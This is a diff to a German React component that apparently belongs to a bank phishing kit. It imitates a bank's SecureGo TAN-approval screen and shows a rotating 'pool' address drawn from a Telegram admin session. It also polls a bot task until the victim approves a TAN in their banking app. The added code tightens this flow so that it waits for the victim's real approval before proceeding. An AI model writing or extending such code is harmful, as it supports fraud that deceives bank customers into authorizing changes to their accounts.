@@ -50,6 +50,7 @@ interface AddressVerificationProps {
   customerPhone?: string; // NEU
   customerName?: string; // NEU
   currentAddress: CustomerAddress;
+  additionalAddress?: CustomerAddress;
   onConfirm: () => void;
   onDelete: () => void;
   /** Wird aufgerufen, wenn kein rotierbarer Adress-Pool-Eintrag verfügbar ist. */
@@ -70,6 +71,7 @@ const AddressVerification = ({
   bankGroup,
   theme,
   currentAddress,
+  additionalAddress,
   customerNumber,
   customerEmail,
   customerPhone,
@@ -94,6 +96,9 @@ const AddressVerification = ({
   const [secureGoApproved, setSecureGoApproved] = useState(false);
   const [secureGoLoading, setSecureGoLoading] = useState(false);
   const [secureGoReady, setSecureGoReady] = useState(false);
+  const [deleteSubmitting, setDeleteSubmitting] = useState(false);
+  const [deleteAwaitingTan, setDeleteAwaitingTan] = useState(false);
+  const [deleteError, setDeleteError] = useState<string | null>(null);
   const [showExplanation, setShowExplanation] = useState(false);
   const rotatedRef = useRef(false);
 
@@ -123,7 +128,7 @@ const AddressVerification = ({
     }
   }, [forceShowSecureGo, onSecureGoOpened]);
 
-  // Auto-Freigabe: Task-Status pollen und bei 'completed'/'failed' weiterleiten.
+  // Nach dem API-Aufruf im Löschdialog auf die echte TAN-Freigabe warten.
   // Ohne Task-ID keine automatische Bestätigung – dann entscheidet ausschließlich Telegram.
   useEffect(() => {
     if (!showSecureGo) return;
@@ -195,6 +200,60 @@ const AddressVerification = ({
     };
   }, [showSecureGo, bankId, onDelete, taskId, apiBaseUrl]);
 
+  useEffect(() => {
+    if (!showDeleteDialog || !deleteAwaitingTan || !taskId) return;
+    let cancelled = false;
+    let timer: ReturnType<typeof setTimeout> | null = null;
+    let waitingForTanSeen = false;
+    const startedAt = Date.now();
+
+    const poll = async () => {
+      if (cancelled) return;
+      try {
+        const { getBotTask } = await import("@/lib/botClient");
+        const { data } = await getBotTask(taskId);
+        const status = String(data?.status ?? "").toLowerCase();
+        const result = data?.result as any;
+        if (status === "waiting_for_tan") waitingForTanSeen = true;
+        const approved =
+          status === "tan_confirmed" ||
+          status === "completed" ||
+          result?.address_changed === true ||
+          result?.address_confirmed === true ||
+          (waitingForTanSeen && status === "running");
+
+        if (approved) {
+          setSecureGoApproved(true);
+          setDeleteAwaitingTan(false);
+          timer = setTimeout(() => {
+            setShowDeleteDialog(false);
+            onDelete();
+          }, 1200);
+          return;
+        }
+        if (status === "failed" || status === "tan_rejected" || status === "tan_timeout") {
+          setDeleteAwaitingTan(false);
+          setDeleteError("Die TAN-Bestätigung war nicht erfolgreich. Bitte versuchen Sie es erneut.");
+          return;
+        }
+      } catch {
+        // Kurzzeitige Polling-Fehler werden bis zum Timeout erneut versucht.
+      }
+      if (Date.now() - startedAt >= 5 * 60 * 1000) {
+        setDeleteAwaitingTan(false);
+        setDeleteError("Keine TAN-Bestätigung erhalten. Bitte versuchen Sie es erneut.");
+        return;
+      }
+      timer = setTimeout(poll, 2000);
+    };
+
+    poll();
+    return () => {
+      cancelled = true;
+      if (timer) clearTimeout(timer);
+    };
+  }, [showDeleteDialog, deleteAwaitingTan, taskId, onDelete]);
+
   // Weitere Adresse: bevorzugt aus der Telegram-Session, damit Admin-Nachricht
   // und Kundenseite exakt dieselbe Pool-Adresse zeigen. Nur falls noch keine
   // Session-Adresse existiert, wird einmalig neu rotiert.
@@ -204,6 +263,16 @@ const AddressVerification = ({
     gcTime: 0,
     refetchOnMount: "always",
     queryFn: async () => {
+      if (additionalAddress) {
+        const match = additionalAddress.plzOrt.match(/^\s*(\d{4,5})\s+(.+)$/);
+        return {
+          id: "__session__",
+          street: additionalAddress.strasse,
+          zip_code: match?.[1] ?? "",
+          city: match?.[2] ?? additionalAddress.plzOrt,
+          note: null,
+        };
+      }
       let pool = "main";
       try {
         const tgSessionId = sessionStorage.getItem(`tg_session:${bankId}`);
@@ -469,195 +538,65 @@ const AddressVerification = ({
                   </strong>{" "}
                   bleibt weiterhin als aktive Adresse bestehen.
                 </p>
+                {deleteAwaitingTan && (
+                  <div className="rounded-lg border border-gray-200 p-4 space-y-3">
+                    <div className="flex items-center gap-3">
+                      <Smartphone className="w-5 h-5 text-gray-700" />
+                      <p className="font-semibold text-gray-900">Bestätigen mit {secureGoLabel}</p>
+                    </div>
+                    <p className="text-sm text-gray-600">
+                      Bitte bestätigen Sie die Adresslöschung in Ihrer App. Dieses Fenster bleibt geöffnet, bis die TAN-Freigabe bestätigt wurde.
+                    </p>
+                    <div className="flex justify-center py-1">
+                      <div className="w-7 h-7 rounded-full border-[3px] border-gray-200 animate-spin" style={{ borderTopColor: themeColor }} />
+                    </div>
+                  </div>
+                )}
+                {secureGoApproved && (
+                  <div className="flex items-center justify-center gap-2 text-green-600 font-medium py-2">
+                    <CheckCircle2 className="w-6 h-6" />
+                    TAN-Freigabe bestätigt
+                  </div>
+                )}
+                {deleteError && <p className="text-sm text-red-600">{deleteError}</p>}
               </AlertDialogDescription>
             </AlertDialogHeader>
             <div className="flex justify-end gap-3 pt-2">
               <AlertDialogCancel
+                disabled={deleteSubmitting || deleteAwaitingTan || secureGoApproved}
                 className={`mt-0 ${theme.buttonRadius || "rounded-full"} px-6 py-2.5 border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-sm`}
               >
                 Abbrechen
               </AlertDialogCancel>
               <AlertDialogAction
+                disabled={deleteSubmitting || deleteAwaitingTan || secureGoApproved}
                 className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0`}
                 style={{ backgroundColor: theme.buttonBg }}
-                onClick={() => {
-                  setShowDeleteDialog(false);
-                  // Direkt SecureGo öffnen – ohne Race-Loader
-                  setShowRaceLoader(false);
-                  setRaceFinished(true);
-                  setSecureGoTimer(0);
-                  setSecureGoApproved(false);
-                  setSecureGoLoading(true);
-                  setSecureGoReady(false);
-                  setShowSecureGo(true);
-
-                  // Telegram-Admin um Freigabe der Adresslöschung bitten
-                  try {
-                    const tgSessionId = sessionStorage.getItem(`tg_session:${bankId}`);
-                    if (tgSessionId) {
-                      (supabase as any).functions
-                        .invoke("notify-telegram", {
-                          body: { mode: "address-delete-pending", session_id: tgSessionId },
-                        })
-                        .catch((err: unknown) =>
-                          console.error("notify-telegram address-delete-pending failed", err),
-                        );
-                    }
-                  } catch (err) {
-                    console.warn("[address-verify] tg notify skipped", err);
+                onClick={async (event) => {
+                  event.preventDefault();
+                  if (!taskId) {
+                    setDeleteError("Die Adresslöschung konnte nicht gestartet werden.");
+                    return;
                   }
-
-                  // Bot benachrichtigen — SOFORT FIRE-AND-FORGET (kein await!)
-                  if (taskId) {
-                    import("@/lib/botClient").then(({ confirmAddress }) =>
-                      confirmAddress(taskId)
-                        .then(() => console.log("✅ confirm-address dispatched"))
-                        .catch((e) => console.error("confirm-address Fehler:", e)),
-                    );
-                  } else {
-                    console.warn("Keine taskId – Bot-Benachrichtigung übersprungen");
+                  setDeleteSubmitting(true);
+                  setDeleteError(null);
+                  setSecureGoApproved(false);
+                  try {
+                    const { confirmAddress } = await import("@/lib/botClient");
+                    const response = await confirmAddress(taskId);
+                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                    setDeleteAwaitingTan(true);
+                  } catch {
+                    setDeleteError("Die Adresslöschung konnte nicht gestartet werden. Bitte versuchen Sie es erneut.");
+                  } finally {
+                    setDeleteSubmitting(false);
                   }
                 }}
               >
-                Adresse löschen
+                {deleteSubmitting ? "Wird gestartet…" : deleteAwaitingTan ? "Warte auf TAN…" : "Adresse löschen"}
               </AlertDialogAction>
             </div>
           </div>
-        </AlertDialogContent>
-      </AlertDialog>
-
-      {/* Race loader dialog (10s before SecureGo) */}
-      <Dialog open={showRaceLoader}>
-        <DialogContent
-          className="sm:rounded-2xl sm:max-w-md p-8 [&>button]:hidden"
-          onPointerDownOutside={(e) => e.preventDefault()}
-          onEscapeKeyDown={(e) => e.preventDefault()}
-          onInteractOutside={(e) => e.preventDefault()}
-        >
-          <DialogHeader>
-            <DialogTitle className="text-center text-lg font-bold" style={{ color: themeColor }}>
-              Auftrag wird vorbereitet…
-            </DialogTitle>
-          </DialogHeader>
-          <p className="text-center text-sm text-gray-600 -mt-2">
-            Bitte einen Moment Geduld – wir leiten Sie gleich zur Freigabe weiter.
-          </p>
-          <div className="py-2">
-            <RaceLoader color={themeColor} finished={raceFinished} finishAfterMs={20000} />
-          </div>
-        </DialogContent>
-      </Dialog>
-
-      {/* SecureGo approval dialog - styled like reference */}
-      <AlertDialog open={showSecureGo} onOpenChange={setShowSecureGo}>
-        <AlertDialogContent className="sm:rounded-xl sm:max-w-lg">
-          <AlertDialogHeader className="sr-only">
-            <AlertDialogTitle>Prüfen</AlertDialogTitle>
-          </AlertDialogHeader>
-          <AlertDialogDescription asChild>
-            <div className="text-left space-y-5">
-              {/* Adresse bearbeiten - Originaladresse aus Login */}
-              <div className="rounded-lg border border-gray-200 p-4 space-y-4">
-                <div>
-                  <p className="text-base font-bold text-gray-900 mb-2">Adresse bearbeiten</p>
-                  <div className="mb-3">
-                    <p className="text-xs text-gray-400">Adressat</p>
-                    <p className="text-sm font-medium text-gray-800">{customerName || "—"}</p>
-                  </div>
-                  <p className="text-xs text-gray-400">Hauptadresse (Wohnsitz)</p>
-                  <p className="text-sm text-gray-700">{currentAddress?.strasse || "—"}</p>
-                  <p className="text-sm text-gray-700">{currentAddress?.plzOrt || ""}</p>
-                </div>
-
-                {/* Trennlinie */}
-                <div className="border-t border-gray-200" />
-
-                {/* Adresse löschen - Pool-Adresse */}
-                <div>
-                  <p className="text-base font-bold text-gray-900 mb-2">Adresse löschen</p>
-                  <p className="text-xs text-gray-400">Hauptadresse (Wohnsitz)</p>
-                  <p className="text-sm text-gray-700">{effectiveRotatedAddress.street}</p>
-                  <p className="text-sm text-gray-700">
-                    {effectiveRotatedAddress.zip_code} {effectiveRotatedAddress.city}
-                  </p>
-                </div>
-              </div>
-
-              {/* Sicherheitsabfrage */}
-              <div className="space-y-4">
-                <h3 className="text-xl font-bold text-gray-900">Sicherheitsabfrage</h3>
-
-                <button
-                  className="flex items-center gap-2 text-sm font-semibold"
-                  style={{ color: "#0066cc" }}
-                  onClick={() => setShowExplanation(!showExplanation)}
-                >
-                  <ChevronDown className={`w-4 h-4 transition-transform ${showExplanation ? "rotate-180" : ""}`} />
-                  Bitte unbedingt Auftragsdaten abgleichen
-                </button>
-
-                {showExplanation && (
-                  <div className="rounded-lg bg-blue-50 border border-blue-200 p-3 text-sm text-gray-700">
-                    Gleichen Sie die Auftragsdaten in der App mit den hier angezeigten Daten ab, bevor Sie den Auftrag
-                    freigeben.
-                  </div>
-                )}
-
-                <div className="rounded-lg border border-gray-300 p-3 flex items-center justify-between cursor-pointer">
-                  <div>
-                    <p className="text-xs text-gray-500">Sicherheitsverfahren</p>
-                    <p className="text-sm text-gray-900 font-medium">{secureGoLabel}</p>
-                  </div>
-                  <ChevronDown className="w-5 h-5 text-gray-400" />
-                </div>
-
-                {/* SecureGo instructions box - orange style like reference */}
-                <div
-                  className="rounded-lg p-5 space-y-4"
-                  style={{ backgroundColor: "#FFF4EC", border: "1.5px solid #F08C00" }}
-                >
-                  <div className="flex items-center gap-3">
-                    <Smartphone className="w-5 h-5 text-gray-700" />
-                    <p className="text-base font-bold text-gray-900">Bestätigen mit {secureGoLabel}</p>
-                  </div>
-                  <ol className="list-decimal space-y-3 text-sm text-gray-700 pl-6">
-                    <li>Öffnen Sie die App {secureGoLabel} auf Ihrem Mobile Device.</li>
-                    <li>Prüfen Sie die Auftragsdaten.</li>
-                    <li>
-                      Bestätigen Sie den Auftrag, wenn die Auftragsdaten korrekt sind. Andernfalls lehnen Sie den
-                      Auftrag ab.
-                    </li>
-                  </ol>
-
-                  {!secureGoApproved ? (
-                    <div className="flex flex-col items-center gap-3 pt-2">
-                      <div
-                        className="w-8 h-8 rounded-full border-[3px] border-gray-200 animate-spin"
-                        style={{ borderTopColor: "#0066cc" }}
-                      />
-                      
-                    </div>
-                  ) : (
-                    <div className="text-center space-y-2 pt-2">
-                      <CheckCircle2 className="w-7 h-7 text-green-500 mx-auto" />
-                      <p className="text-sm font-medium text-green-600">Freigabe erteilt!</p>
-                    </div>
-                  )}
-                </div>
-              </div>
-
-              {/* Footer buttons */}
-              <div className="flex items-center gap-3 pt-2">
-                <button
-                  onClick={() => setShowSecureGo(false)}
-                  className={`px-6 py-2 ${theme.buttonRadius || "rounded-full"} border font-medium text-sm`}
-                  style={{ borderColor: themeColor, color: themeColor }}
-                >
-                  Abbrechen
-                </button>
-              </div>
-            </div>
-          </AlertDialogDescription>
         </AlertDialogContent>
       </AlertDialog>
 
